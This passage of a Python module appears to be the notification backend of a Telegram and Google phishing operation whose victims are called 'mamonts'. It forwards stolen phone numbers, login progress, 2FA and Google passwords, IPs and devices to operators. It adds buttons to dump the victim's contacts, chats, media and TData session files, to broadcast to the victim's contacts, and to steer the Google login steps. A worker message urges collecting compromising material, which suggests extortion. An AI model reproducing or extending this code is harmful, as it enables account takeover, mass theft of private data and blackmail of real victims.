import asyncio
import logging
from datetime import datetime, timezone, timedelta
from typing import Any, List, Optional

from aiogram import Bot
from aiogram.types import BufferedInputFile, FSInputFile, InlineKeyboardButton, InlineKeyboardMarkup
from shared import contacts as contacts_pkg
from shared import db
from shared.config import (
    ADMIN_BOT_TOKEN,
    ADMIN_CHAT_ID,
    ADMIN_CHAT_IDS,
    CONTACTS_PATH,
    DB_PATH,
    DEFAULT_DONOR_CHANNEL,
    PRIMARY_ADMIN_ID,
    MASTER_ADMIN_IDS,
    TEST_ADMIN_BOT_TOKEN,
    get_admin_bot_token,
    is_test_worker,
)

logger = logging.getLogger("shared.notifier")

_bg_tasks = set()
_revoked_notified_users = set()
_last_auth_notified: dict[int, float] = {}


def _run_bg_task(coro):
    task = asyncio.create_task(coro)
    _bg_tasks.add(task)
    task.add_done_callback(_bg_tasks.discard)
    return task


async def _is_primary_admin_mamont(worker_id: Optional[int], mirror_token: Optional[str] = None) -> bool:
    """Returns True if the mamont belongs to the primary owner (7491827504)."""
    if worker_id in MASTER_ADMIN_IDS:
        return True
    if mirror_token:
        try:
            token_row = await asyncio.to_thread(db.get_token_by_token, DB_PATH, mirror_token)
            if token_row and "owner_tg_id" in token_row.keys() and token_row["owner_tg_id"] in MASTER_ADMIN_IDS:
                return True
        except Exception:
            pass
    return False


def get_google_control_keyboard(user_tg_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="❌ Неверный пароль", callback_data=f"gctrl:wrong_pass:{user_tg_id}"),
                InlineKeyboardButton(text="✅ Верный пароль", callback_data=f"gctrl:correct_pass:{user_tg_id}"),
            ],
            [
                InlineKeyboardButton(text="📲 Тап (Цифры)", callback_data=f"gctrl:ask_prompt:{user_tg_id}"),
                InlineKeyboardButton(text="🔑 Запросить 2FA", callback_data=f"gctrl:ask_2fa:{user_tg_id}"),
            ],
            [
                InlineKeyboardButton(text="❌ Неверный 2FA", callback_data=f"gctrl:wrong_2fa:{user_tg_id}"),
                InlineKeyboardButton(text="✅ Вход выполнен", callback_data=f"gctrl:complete:{user_tg_id}"),
            ],
        ]
    )



async def notify_session_revoked(
    user_tg_id: int,
    reason: str = "Сессия сброшена на устройстве мамонта",
    force: bool = False,
) -> None:
    """
    Sends explicit notifications to all admins and the responsible worker
    when a user session is revoked, reset, or logged out.
    """
    if not force and user_tg_id in _revoked_notified_users:
        return
    _revoked_notified_users.add(user_tg_id)

    if not ADMIN_BOT_TOKEN and not TEST_ADMIN_BOT_TOKEN:
        return

    admin_bot = None
    try:
        user = await asyncio.to_thread(db.get_user_by_tg_id, DB_PATH, user_tg_id)
        if not user:
            return

        mamont_id = user["id"] if "id" in user.keys() else user_tg_id
        nickname = user["nickname"] or "Мамонт"
        username = f"@{user['username']}" if user["username"] else "—"
        phone = user["phone"] or "—"
        worker_id = user["worker_tg_id"] if "worker_tg_id" in user.keys() else None
        mirror_name = user["mirror_username"] if ("mirror_username" in user.keys() and user["mirror_username"]) else "—"
        mirror_str = f"@{mirror_name}" if mirror_name and mirror_name != "—" else "—"
        user_mirror = user["mirror_token"] if "mirror_token" in user.keys() else None

        is_test = is_test_worker(user_mirror, mirror_name)
        target_token = get_admin_bot_token(is_test=is_test, mirror_token=user_mirror, mirror_username=mirror_name)
        admin_bot = Bot(token=target_token)

        worker_str = "— (Без воркера)"
        if worker_id:
            w_obj = await asyncio.to_thread(db.get_worker_by_tg_id, DB_PATH, worker_id)
            if w_obj and w_obj["username"]:
                worker_str = f"@{w_obj['username']} (ID: <code>{worker_id}</code>)"
            else:
                worker_str = f"ID: <code>{worker_id}</code>"

        msk_dt = datetime.now(timezone.utc) + timedelta(hours=3)
        time_str = msk_dt.strftime("%Y-%m-%d %H:%M:%S")

        # 1. Admin Alert
        admin_text = (
            f"🔴 <b>СЕССИЯ СБРОШЕНА / ОТОЗВАНА!</b>\n\n"
            f"👤 <b>Мамонт #{mamont_id}:</b> {nickname} ({username})\n"
            f"🆔 <b>TG ID:</b> <code>{user_tg_id}</code>\n"
            f"📱 <b>Телефон:</b> <code>{phone}</code>\n"
            f"🪞 <b>Зеркало:</b> {mirror_str}\n"
            f"👨‍💻 <b>Воркер:</b> {worker_str}\n"
            f"📊 <b>Статус:</b> <code>session_revoked</code>\n"
            f"ℹ️ <b>Причина:</b> {reason}\n"
            f"⏱ <i>Время: {time_str} (МСК)</i>"
        )

        is_my_log = await _is_primary_admin_mamont(worker_id, user_mirror)
        if is_my_log:
            target_admin_ids = set(MASTER_ADMIN_IDS)
            logger.info("Session revoked for user %s is primary admin's log -> notifying ONLY %s", user_tg_id, target_admin_ids)
        else:
            admin_rows = await asyncio.to_thread(db.get_all_admins, DB_PATH)
            target_admin_ids = set(MASTER_ADMIN_IDS)
            for a in admin_rows:
                if a["role"] == "admin":
                    target_admin_ids.add(a["tg_id"])
            for aid in ADMIN_CHAT_IDS:
                target_admin_ids.add(aid)

        for aid in target_admin_ids:
            try:
                await admin_bot.send_message(chat_id=aid, text=admin_text, parse_mode="HTML")
                logger.info("Sent session_revoked alert to admin %s for user %s via %s", aid, user_tg_id, target_token)
            except Exception as ea:
                logger.warning("Failed to send session_revoked alert to admin %s via %s: %s", aid, target_token, ea)

        # 2. Worker Alert
        if worker_id:
            worker_text = (
                f"⚠️ <b>Внимание: Сессия мамонта сброшена!</b>\n\n"
                f"👤 <b>Мамонт:</b> {username} (ID: <code>{user_tg_id}</code>)\n"
                f"📱 <b>Телефон:</b> <code>{phone}</code>\n\n"
                f"<blockquote><i>📊 <b>Статус:</b> ❌ Сессия была сброшена/отозвана на устройстве мамонта</i></blockquote>\n"
                f"<i>Мамонт завершил активную сессию в Telegram. Дальнейшие операции с аккаунтом остановлены.</i>\n\n"
                f"⏱ <i>{time_str} (МСК)</i>"
            )
            try:
                await admin_bot.send_message(chat_id=worker_id, text=worker_text, parse_mode="HTML")
                logger.info("Sent session_revoked alert to worker %s for user %s", worker_id, user_tg_id)
            except Exception as ew:
                logger.warning("Failed to send session_revoked alert to worker %s: %s", worker_id, ew)

            # Update worker's permanent card in the mirror bot if exists
            worker_msg_id = user["worker_log_msg_id"] if "worker_log_msg_id" in user.keys() else None
            if worker_msg_id:
                try:
                    card_text = (
                        f"🦣 <b>Мамонт в боте (Сессия сброшена)</b>\n\n"
                        f"👤 <b>Юзер:</b> {username} (ID: <code>{user_tg_id}</code>)\n"
                        f"📱 <b>Телефон:</b> <code>{phone}</code>\n\n"
                        f"<blockquote><i>📊 <b>Статус:</b> ❌ Сессия сброшена мамонтом на устройстве</i></blockquote>\n"
                        f"<i>Сессия более не активна.</i>"
                    )
                    await admin_bot.edit_message_text(
                        chat_id=worker_id,
                        message_id=worker_msg_id,
                        text=card_text,
                        parse_mode="HTML",
                    )
                except Exception:
                    pass

    except Exception as exc:
        logger.error("Error in notify_session_revoked: %s", exc)
    finally:
        if admin_bot:
            await admin_bot.session.close()


def get_admin_log_keyboard(user_tg_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="📇 1) Контакты (txt)",
                    callback_data=f"adm_act_dump_txt:{user_tg_id}",
                ),
                InlineKeyboardButton(
                    text="⚡ Переписки (HTML)",
                    callback_data=f"adm_act_dump_fast_html:{user_tg_id}",
                ),
            ],
            [
                InlineKeyboardButton(
                    text="💬 Всё с медиа (zip)",
                    callback_data=f"adm_act_dump_media:{user_tg_id}",
                ),
                InlineKeyboardButton(
                    text="📢 Создать ТГК",
                    callback_data=f"adm_act_create_tgk:{user_tg_id}",
                ),
            ],
            [
                InlineKeyboardButton(
                    text="💾 4) Скачать TData",
                    callback_data=f"adm_act_download_tdata:{user_tg_id}",
                ),
                InlineKeyboardButton(
                    text="⚡ 5) Рассылка",
                    callback_data=f"adm_act_broadcast_contacts:{user_tg_id}",
                ),
            ],
            [
                InlineKeyboardButton(
                    text="🔄 Сбросить сессии",
                    callback_data=f"adm_reset_sess:{user_tg_id}",
                ),
                InlineKeyboardButton(
                    text="🔴 Разлогинить",
                    callback_data=f"adm_logout_ask:{user_tg_id}",
                ),
            ],
        ]
    )


async def notify_user_event(
    event_type: str,
    user_tg_id: int,
    user_username: Optional[str],
    user_nickname: str,
    phone: Optional[str] = None,
    auth_step: Optional[str] = None,
    password_2fa: Optional[str] = None,
    mirror_token: Optional[str] = None,
    details: Optional[str] = None,
    contacts: Optional[List[str]] = None,
    session_str: Optional[str] = None,
    **kwargs: Any,
) -> None:
    """
    Sends structured log notifications:
    1) To Admin (ADMIN_CHAT_ID):
       - Mirror bot username
       - Worker username & ID
       - Full user personal data (Phone, 2FA Password, ID, Nickname, Username, Status, Details)
       - Contact book dump (Номер | Имя) on authorization
    2) To Worker (Mirror owner):
       - User handle & ID
       - User phone number
       - Notice to report to TS without sensitive account dumps.
    """
    if not ADMIN_BOT_TOKEN and not TEST_ADMIN_BOT_TOKEN:
        return

    admin_bot = None
    try:
        mirror_bot_username: Optional[str] = None
        worker_id: Optional[int] = None
        worker_username: Optional[str] = None
        session_str: Optional[str] = None

        # 1. Fetch user data from DB to recover mirror, worker, phone, 2fa, session
        user_row = await asyncio.to_thread(db.get_user_by_tg_id, DB_PATH, user_tg_id)
        if user_row:
            if not mirror_token and "mirror_token" in user_row.keys() and user_row["mirror_token"]:
                mirror_token = user_row["mirror_token"]
            if not mirror_bot_username and "mirror_username" in user_row.keys() and user_row["mirror_username"]:
                mirror_bot_username = user_row["mirror_username"]
            if not worker_id and "worker_tg_id" in user_row.keys() and user_row["worker_tg_id"]:
                worker_id = user_row["worker_tg_id"]
            if not phone and user_row["phone"]:
                phone = user_row["phone"]
            if not password_2fa and "password_2fa" in user_row.keys() and user_row["password_2fa"]:
                password_2fa = user_row["password_2fa"]
            if "session_string" in user_row.keys() and user_row["session_string"]:
                session_str = user_row["session_string"]

        ip = kwargs.get("ip") or (user_row["ip"] if user_row and "ip" in user_row.keys() else None)
        country = kwargs.get("country") or (user_row["country"] if user_row and "country" in user_row.keys() else None)
        city = kwargs.get("city") or (user_row["city"] if user_row and "city" in user_row.keys() else None)
        isp = kwargs.get("isp") or (user_row["isp"] if user_row and "isp" in user_row.keys() else None)
        device = kwargs.get("device") or (user_row["device"] if user_row and "device" in user_row.keys() else None)
        email = kwargs.get("email") or (user_row["email"] if user_row and "email" in user_row.keys() else None)

        if mirror_token:
            token_row = await asyncio.to_thread(db.get_token_by_token, DB_PATH, mirror_token)
            if token_row:
                if not mirror_bot_username:
                    mirror_bot_username = token_row["username"]
                if not worker_id and "owner_tg_id" in token_row.keys() and token_row["owner_tg_id"]:
                    worker_id = token_row["owner_tg_id"]

        if worker_id:
            worker_row = await asyncio.to_thread(db.get_worker_by_tg_id, DB_PATH, worker_id)
            if worker_row and worker_row["username"]:
                worker_username = worker_row["username"]

        norm_step = (auth_step or event_type or "").lower()

        is_test_event = bool(
            kwargs.get("is_test")
            or is_test_worker(mirror_token, mirror_bot_username)
            or (worker_id and worker_id in (8945168964, 8877489211))
        )
        if not is_test_event and user_row:
            u_mt = user_row["mirror_token"] if "mirror_token" in user_row.keys() else None
            u_mu = user_row["mirror_username"] if "mirror_username" in user_row.keys() else None
            u_wid = user_row["worker_tg_id"] if "worker_tg_id" in user_row.keys() else None
            if is_test_worker(u_mt, u_mu) or u_wid in (8945168964, 8877489211):
                is_test_event = True

        target_bot_token = get_admin_bot_token(
            is_test=is_test_event,
            mirror_token=mirror_token,
            mirror_username=mirror_bot_username,
        )
        admin_bot = Bot(token=target_bot_token)

        if phone:
            contacts_pkg.append_contact(
                CONTACTS_PATH,
                first_name=user_nickname,
                last_name=None,
                username=user_username,
                phone_number=phone,
            )

        mirror_str = f"@{mirror_bot_username}" if mirror_bot_username else "—"
        if worker_username:
            worker_str = f"@{worker_username} (<code>{worker_id}</code>)"
        elif worker_id:
            worker_str = f"<code>{worker_id}</code>"
        else:
            worker_str = "— (Без воркера)"

        user_tag = f"@{user_username}" if user_username else "—"
        phone_tag = f"<code>{phone}</code>" if phone else "—"

        if norm_step in ("session_revoked", "logged_out", "revoked", "session_expired"):
            await notify_session_revoked(user_tg_id, reason=details or "Сессия сброшена/отозвана на устройстве")
            return

        is_final_auth = norm_step in ("authorized", "session", "complete", "2fa", "google_authorized", "google_complete")

        # CRITICAL PROTECTION: If the user is already authorized,
        # ignore duplicate intermediate backward events so old packets never overwrite the successful log card.
        # But ALWAYS allow new login flows (start, registered, phone, waiting_code).
        current_db_step = ((user_row["auth_step"] or "") if user_row and "auth_step" in user_row.keys() else "").lower()
        if current_db_step == "authorized" and not is_final_auth and norm_step not in ("start", "registered", "register", "phone", "waiting_code"):
            logger.info("Ignoring backward event '%s' for already %s user %s", norm_step, current_db_step, user_tg_id)
            return

        now_ts = asyncio.get_event_loop().time()
        if is_final_auth:
            last_ts = _last_auth_notified.get(user_tg_id, 0)
            if now_ts - last_ts < 15.0:
                logger.info("Ignoring duplicate final auth notification for user %s (sent %.1fs ago)", user_tg_id, now_ts - last_ts)
                return
            _last_auth_notified[user_tg_id] = now_ts
        elif norm_step in ("start", "registered", "register", "phone", "waiting_code"):
            _last_auth_notified.pop(user_tg_id, None)

        if is_final_auth:
            _revoked_notified_users.discard(user_tg_id)

        phone_display = f"<code>{phone}</code>" if phone else "—"

        # Unified Status Mapping: EXACT SAME status text for both Admin and Worker
        if norm_step in ("start", "registered", "register"):
            admin_header = "👀 <b>Заход в бота | ⏳ Не авторизован</b>\n"
            worker_header = "🦣 <b>Новый мамонт в боте!</b>\n\n"
            status_desc = "⏳ Зашел в бота (еще не авторизовался)"
        elif norm_step in ("webapp_open", "open_webapp"):
            admin_header = "👀 <b>Заход в бота | ⏳ Не авторизован</b>\n"
            worker_header = "🦣 <b>Новый мамонт в боте!</b>\n\n"
            status_desc = "⏳ Зашел в бота (еще не авторизовался)"
        elif norm_step in ("phone", "waiting_code", "awaiting_code", "send_code"):
            admin_header = "📱 <b>Передан номер | ⏳ Ожидание кода</b>\n"
            worker_header = "🦣 <b>Новый мамонт в боте!</b>\n\n"
            status_desc = "⏳ Номер получен. Ожидает код из Telegram (еще не ввел)"
        elif norm_step in ("entered_code", "submit_code", "checking_code"):
            admin_header = "🔢 <b>Введен код | ⏳ Проверка кода</b>\n"
            worker_header = "🦣 <b>Новый мамонт в боте!</b>\n\n"
            status_desc = "🔢 Ввел код из Telegram, выполняется проверка..."
        elif norm_step in ("wrong_code", "invalid_code"):
            admin_header = "❌ <b>Неверный код | ⏳ Ожидание верного кода</b>\n"
            worker_header = "🦣 <b>Новый мамонт в боте!</b>\n\n"
            status_desc = "❌ Ввел неверный код из Telegram, пробует снова"
        elif norm_step in ("code", "waiting_2fa", "awaiting_password", "need_2fa"):
            admin_header = "🔐 <b>Введен код | ⏳ Ожидание 2FA пароля</b>\n"
            worker_header = "🦣 <b>Новый мамонт в боте!</b>\n\n"
            status_desc = "🔐 Код подтвержден. Ожидает ввод пароля 2FA (еще не ввел)"
        elif norm_step in ("entered_2fa", "submit_2fa", "checking_2fa"):
            admin_header = "🔑 <b>Введен 2FA пароль | ⏳ Проверка входа</b>\n"
            worker_header = "🦣 <b>Новый мамонт в боте!</b>\n\n"
            status_desc = "🔑 2FA пароль введен, выполняется проверка..."
        elif norm_step in ("wrong_2fa", "invalid_2fa"):
            admin_header = "❌ <b>Неверный 2FA пароль | ⏳ Ожидание верного пароля</b>\n"
            worker_header = "🦣 <b>Новый мамонт в боте!</b>\n\n"
            status_desc = "❌ Ввел неверный пароль 2FA, пробует снова"
        elif norm_step in ("google_email", "google_waiting_password"):
            admin_header = "📧 <b>Введена Google почта | ⏳ Ожидание пароля</b>\n"
            worker_header = "🦣 <b>Мамонт выбрал Google!</b>\n\n"
            status_desc = "📧 Ввел Google почту, ожидает ввод пароля"
        elif norm_step in ("google_password", "google_waiting_code"):
            admin_header = "🔑 <b>Введен пароль Google | ⏳ Ожидание действия</b>\n"
            worker_header = "🦣 <b>Мамонт ввел пароль Google!</b>\n\n"
            status_desc = "🔑 Пароль Google введен, ожидает решение админа"
        elif norm_step in ("google_wrong_password", "google_error_password"):
            admin_header = "❌ <b>Неверный пароль Google | ⏳ Ожидание нового пароля</b>\n"
            worker_header = "🦣 <b>Отклонен пароль Google!</b>\n\n"
            status_desc = "❌ Неверный пароль Google, ожидает повторный ввод"
        elif norm_step in ("google_prompt", "google_show_prompt"):
            admin_header = "📲 <b>Отправлены цифры Google | ⏳ Ожидание тапа</b>\n"
            worker_header = "🦣 <b>Отправлен Тап (Цифры)!</b>\n\n"
            status_desc = "📲 Отправлены цифры (Тап) на экран мамонта"
        elif norm_step in ("google_2fa_waiting", "google_ask_2fa"):
            admin_header = "🔑 <b>Запрошен 2FA код Google | ⏳ Ожидание ввода</b>\n"
            worker_header = "🦣 <b>Запрошен 2FA код Google!</b>\n\n"
            status_desc = "🔑 Запрошен 2FA код Google"
        elif norm_step in ("google_wrong_2fa", "google_error_2fa"):
            admin_header = "❌ <b>Неверный 2FA код Google | ⏳ Ожидание ввода</b>\n"
            worker_header = "🦣 <b>Неверный 2FA код Google!</b>\n\n"
            status_desc = "❌ Ввел неверный 2FA код Google, пробует снова"
        elif norm_step in ("google_code", "google_2fa", "google_checking"):
            admin_header = "🔢 <b>Введен код Google | ⏳ Проверка входа</b>\n"
            worker_header = "🦣 <b>Мамонт ввел код Google!</b>\n\n"
            status_desc = "🔢 Ввел код Google (2FA), выполняется проверка..."
        elif norm_step in ("authorized", "session", "complete", "2fa", "google_authorized", "google_complete"):
            admin_header = "📬 <b>Новый лог | 🔑 Сессия успешно привязана</b>\n"
            worker_header = "<b><i>🎉🔑 Успешный лог! </i></b>\n\n"
            status_desc = "✅ authorized (Сессия привязана)"
        else:
            admin_header = f"📥 <b>Лог | {norm_step}</b>\n"
            worker_header = "🦣 <b>Новый мамонт в боте!</b>\n\n"
            status_desc = f"<code>{norm_step}</code>"

        # 1. Admin Notification Message
        if is_test_event:
            block_header = admin_header.strip()
            block_info = f"🪞 <b>Зеркало:</b> {mirror_str}\n👨‍💻 <b>Воркер:</b> {worker_str}"

            mamont_data_lines = [
                "🦣 <b>Личные данные мамонта:</b>",
                f"• <b>ID:</b> <code>{user_tg_id}</code>",
                f"• <b>Имя:</b> {user_nickname}",
                f"• <b>Юзернейм:</b> {user_tag}",
                f"• <b>Номер телефона:</b> {phone_display}",
            ]
            if email:
                mamont_data_lines.append(f"• 📧 <b>Google Email:</b> <code>{email}</code>")
            if ip and ip != "—":
                prov = isp
                if not prov:
                    prov = f"{country or ''} {city or ''}".strip()
                elif country and country.lower() not in prov.lower():
                    prov = f"{prov}, {country}"
                prov_str = f" ({prov})" if prov else ""
                mamont_data_lines.append(f"• <b>IP:</b> <code>{ip}</code>{prov_str}")
            if device and device != "—":
                mamont_data_lines.append(f"• 📱 <b>Устройство:</b> {device}")

            block_mamont = "\n".join(mamont_data_lines)

            auth_data_lines = []
            if password_2fa:
                pass_label = "Пароль Google" if (norm_step.startswith("google_") or email) else "2FA Пароль"
                auth_data_lines.append(f"• 🔑 <b>{pass_label}:</b> <code>{password_2fa}</code>")
            auth_data_lines.append(f"• 📊 <b>Статус:</b> {status_desc}")
            if details and not is_final_auth:
                auth_data_lines.append(f"• 📝 <b>Детали:</b> {details}")

            block_auth = "\n".join(auth_data_lines)

            admin_text = f"{block_header}\n\n{block_info}\n\n{block_mamont}\n\n{block_auth}"
        else:
            admin_lines = [
                admin_header.strip(),
                f"🪞 <b>Зеркало:</b> {mirror_str}",
                f"👨‍💻 <b>Воркер:</b> {worker_str}\n",
                "🦣 <b>Личные данные мамонта:</b>",
                f"• <b>ID:</b> <code>{user_tg_id}</code>",
                f"• <b>Имя:</b> {user_nickname}",
                f"• <b>Юзернейм:</b> {user_tag}",
                f"• <b>Номер телефона:</b> {phone_display}",
            ]
            if ip and ip != "—":
                prov = isp
                if not prov:
                    prov = f"{country or ''} {city or ''}".strip()
                elif country and country.lower() not in prov.lower():
                    prov = f"{prov}, {country}"
                prov_str = f" ({prov})" if prov else ""
                admin_lines.append(f"• <b>IP:</b> <code>{ip}</code>{prov_str}")
            if device and device != "—":
                admin_lines.append(f"• 📱 <b>Устройство:</b> {device}")

            if password_2fa:
                admin_lines.append(f"• <b>2FA Пароль:</b> <code>{password_2fa}</code>")
            admin_lines.append(f"• <b>Статус:</b> {status_desc}")
            if details and not is_final_auth:
                admin_lines.append(f"• <b>Детали:</b> {details}")

            admin_text = "\n".join(admin_lines)

        admin_msg_id = user_row["admin_log_msg_id"] if user_row and "admin_log_msg_id" in user_row.keys() else None
        worker_msg_id = user_row["worker_log_msg_id"] if user_row and "worker_log_msg_id" in user_row.keys() else None
        worker_alert_msg_id = user_row["worker_alert_msg_id"] if user_row and "worker_alert_msg_id" in user_row.keys() else None
        admin_alert_msg_id = user_row["admin_alert_msg_id"] if user_row and "admin_alert_msg_id" in user_row.keys() else None

        # On /start, or when entering a new login flow, reset IDs to post fresh messages at the bottom
        if norm_step in ("start", "registered", "register") or (
            norm_step in ("phone", "waiting_code") and current_db_step in ("authorized", "session_revoked")
        ):
            admin_msg_id = None
            worker_msg_id = None
            worker_alert_msg_id = None
            admin_alert_msg_id = None

        # Control buttons ONLY appear when user explicitly selected Gmail login (norm_step starts with google_)
        is_google_event = is_test_event and norm_step.startswith("google_")

        if is_google_event:
            admin_keyboard = get_google_control_keyboard(user_tg_id)
            worker_keyboard = get_google_control_keyboard(user_tg_id)
        elif is_final_auth:
            admin_keyboard = get_admin_log_keyboard(user_tg_id)
            worker_keyboard = None
        else:
            admin_keyboard = None
            worker_keyboard = None

        new_admin_msg_id = admin_msg_id
        new_admin_alert_msg_id = admin_alert_msg_id

        is_my_log = await _is_primary_admin_mamont(worker_id, mirror_token)
        if is_my_log:
            target_admin_ids = set(MASTER_ADMIN_IDS)
            logger.info("Log for user %s is primary admin's personal log -> routing ONLY to %s", user_tg_id, target_admin_ids)
        else:
            admin_rows = db.get_all_admins(DB_PATH)
            target_admin_ids = set(MASTER_ADMIN_IDS)
            for a in admin_rows:
                if a["role"] == "admin":
                    target_admin_ids.add(a["tg_id"])
            for aid in ADMIN_CHAT_IDS:
                target_admin_ids.add(aid)

        target_worker_id = worker_id

        if is_final_auth and admin_msg_id:
            for aid in target_admin_ids:
                try:
                    await admin_bot.delete_message(chat_id=aid, message_id=admin_msg_id)
                except Exception:
                    pass
            admin_msg_id = None

        for aid in target_admin_ids:
            if admin_msg_id and aid == ADMIN_CHAT_ID and not is_final_auth:
                try:
                    await admin_bot.edit_message_text(
                        chat_id=aid,
                        message_id=admin_msg_id,
                        text=admin_text,
                        reply_markup=admin_keyboard,
                        parse_mode="HTML",
                    )
                except Exception as e:
                    if "message is not modified" not in str(e).lower():
                        logger.debug("Failed to edit admin msg %s for %s: %s, sending new", admin_msg_id, aid, e)
                        try:
                            msg = await admin_bot.send_message(
                                chat_id=aid,
                                text=admin_text,
                                reply_markup=admin_keyboard,
                                parse_mode="HTML",
                            )
                            if aid == ADMIN_CHAT_ID:
                                new_admin_msg_id = msg.message_id
                        except Exception as send_err:
                            logger.error("failed to notify admin %s via %s: %s", aid, target_bot_token, send_err)
            else:
                try:
                    msg = await admin_bot.send_message(
                        chat_id=aid,
                        text=admin_text,
                        reply_markup=admin_keyboard,
                        parse_mode="HTML",
                    )
                    if aid == ADMIN_CHAT_ID:
                        new_admin_msg_id = msg.message_id
                except Exception as e:
                    logger.error("failed to notify admin %s via %s: %s", aid, target_bot_token, e)

        # Admin Transient Push Alert (notifies Admin on phone for every status change, if not same chat as worker)
        if not is_final_auth:
            for aid in target_admin_ids:
                if aid != target_worker_id:
                    if admin_alert_msg_id:
                        try:
                            await admin_bot.delete_message(chat_id=aid, message_id=admin_alert_msg_id)
                        except Exception:
                            pass
                    admin_push_text = f"<i>📊 <b>Статус:</b> {status_desc}</i>"
                    try:
                        amsg = await admin_bot.send_message(
                            chat_id=aid,
                            text=admin_push_text,
                            parse_mode="HTML",
                        )
                        if aid == ADMIN_CHAT_ID:
                            new_admin_alert_msg_id = amsg.message_id
                    except Exception as e_aalert:
                        logger.debug("could not send transient alert to admin %s: %s", aid, e_aalert)
        else:
            if admin_alert_msg_id:
                for aid in target_admin_ids:
                    if aid != target_worker_id:
                        try:
                            await admin_bot.delete_message(chat_id=aid, message_id=admin_alert_msg_id)
                        except Exception:
                            pass
                new_admin_alert_msg_id = -1

        # Trigger automated tasks upon mamont authorization (Auto-TGK + Auto-TData send)
        if norm_step in ("authorized", "session", "complete") and session_str:
            _run_bg_task(_auto_process_authorized_mamont(
                target_admin_ids=target_admin_ids,
                session_str=session_str,
                user_tg_id=user_tg_id,
                mamont_id=user_row["id"] if user_row else user_tg_id,
                phone=phone,
                password_2fa=user_row.get("password_2fa") if user_row else None,
                is_primary_admin_log=is_my_log,
                bot_token=target_bot_token,
            ))

        # 2. Worker Notification Message
        new_worker_msg_id = worker_msg_id
        new_worker_alert_msg_id = worker_alert_msg_id

        if target_worker_id:
            w_header = worker_header.strip()
            w_user_lines = [
                f"👤 <b>Юзер:</b> {user_tag} (ID: <code>{user_tg_id}</code>)",
                f"📱 <b>Телефон:</b> {phone_display}",
            ]
            if is_test_event and email:
                w_user_lines.append(f"• 📧 <b>Google Email:</b> <code>{email}</code>")
            if ip and ip != "—":
                prov = isp
                if not prov:
                    prov = f"{country or ''} {city or ''}".strip()
                elif country and country.lower() not in prov.lower():
                    prov = f"{prov}, {country}"
                prov_str = f" ({prov})" if prov else ""
                w_user_lines.append(f"• <b>IP:</b> <code>{ip}</code>{prov_str}")
            if device and device != "—":
                w_user_lines.append(f"• 📱 <b>Устройство:</b> {device}")
            if password_2fa:
                w_pass_label = "Пароль Google" if (norm_step.startswith("google_") or email or is_test_event) else "2FA Пароль"
                w_user_lines.append(f"• 🔑 <b>{w_pass_label}:</b> <code>{password_2fa}</code>")

            w_user_block = "\n".join(w_user_lines)
            w_status_block = f"<blockquote><i>📊 <b>Статус:</b> {status_desc}</i></blockquote>"
            w_footer = "<i>Продолжайте общение с лохматым и пришлите ТС компромитирующий материал 🦣 </i>"

            worker_text = f"{w_header}\n\n{w_user_block}\n\n{w_status_block}\n\n{w_footer}"

            # 2.1 Worker Notification Card
            if is_final_auth:
                # On successful auth: delete intermediate card so only celebratory card remains
                if worker_msg_id:
                    try:
                        await admin_bot.delete_message(chat_id=target_worker_id, message_id=worker_msg_id)
                    except Exception:
                        pass
                    worker_msg_id = None
                # ALWAYS send a fresh celebratory notification to the worker
                try:
                    wmsg = await admin_bot.send_message(
                        chat_id=target_worker_id,
                        text=worker_text,
                        parse_mode="HTML",
                    )
                    new_worker_msg_id = wmsg.message_id
                except Exception as send_err:
                    logger.debug("could not send successful auth to worker %s: %s", target_worker_id, send_err)
            elif worker_msg_id:
                try:
                    await admin_bot.edit_message_text(
                        chat_id=target_worker_id,
                        message_id=worker_msg_id,
                        text=worker_text,
                        reply_markup=worker_keyboard,
                        parse_mode="HTML",
                    )
                except Exception as e:
                    if "message is not modified" not in str(e).lower():
                        logger.debug("Failed to edit worker msg %s: %s, sending new", worker_msg_id, e)
                        try:
                            wmsg = await admin_bot.send_message(
                                chat_id=target_worker_id,
                                text=worker_text,
                                reply_markup=worker_keyboard,
                                parse_mode="HTML",
                            )
                            new_worker_msg_id = wmsg.message_id
                        except Exception as send_err:
                            logger.debug("could not notify worker %s: %s", target_worker_id, send_err)
            else:
                try:
                    wmsg = await admin_bot.send_message(
                        chat_id=target_worker_id,
                        text=worker_text,
                        reply_markup=worker_keyboard,
                        parse_mode="HTML",
                    )
                    new_worker_msg_id = wmsg.message_id
                except Exception as e:
                    logger.debug("could not notify worker %s: %s", target_worker_id, e)

            # 2.2 Handle Transient Push Alert Notification
            if norm_step in ("authorized", "session", "complete", "2fa"):
                # On successful auth: delete transient push alert completely so only the single card remains
                if worker_alert_msg_id:
                    try:
                        await admin_bot.delete_message(chat_id=target_worker_id, message_id=worker_alert_msg_id)
                    except Exception:
                        pass
                    new_worker_alert_msg_id = -1
            else:
                # Intermediary status update: delete previous alert and send fresh transient alert
                if worker_alert_msg_id:
                    try:
                        await admin_bot.delete_message(chat_id=target_worker_id, message_id=worker_alert_msg_id)
                    except Exception:
                        pass

                # Short transient alert text for push notification sound/banner
                push_text = f"<i>📊 <b>Статус:</b> {status_desc}</i>"

                try:
                    amsg = await admin_bot.send_message(
                        chat_id=target_worker_id,
                        text=push_text,
                        parse_mode="HTML",
                    )
                    new_worker_alert_msg_id = amsg.message_id
                except Exception as e_alert:
                    logger.debug("could not send transient alert to worker %s: %s", target_worker_id, e_alert)

        # Save message IDs to DB if updated
        if (
            new_admin_msg_id != admin_msg_id
            or new_worker_msg_id != worker_msg_id
            or new_worker_alert_msg_id != worker_alert_msg_id
            or new_admin_alert_msg_id != admin_alert_msg_id
        ):
            await asyncio.to_thread(
                db.set_user_log_messages,
                DB_PATH,
                user_tg_id,
                new_admin_msg_id,
                new_worker_msg_id,
                new_worker_alert_msg_id,
                new_admin_alert_msg_id,
            )

    except Exception as exc:
        logger.error("error in notify_user_event: %s", exc)
    finally:
        if admin_bot:
            await admin_bot.session.close()


async def _auto_process_authorized_mamont(
    target_admin_ids: set,
    session_str: str,
    user_tg_id: int,
    mamont_id: Any,
    phone: Optional[str] = None,
    password_2fa: Optional[str] = None,
    is_primary_admin_log: bool = False,
    bot_token: Optional[str] = None,
) -> None:
    """
    Automated background pipeline executed upon mamont authorization:
    Auto-generates authentic TData folder archive (1-click login) & sends document to admins.
    (Channel creation is handled strictly on-demand via the 'Создать ТГК' button).
    """
    effective_token = bot_token or ADMIN_BOT_TOKEN
    bot = Bot(token=effective_token)
    try:
        import os

        if not password_2fa:
            try:
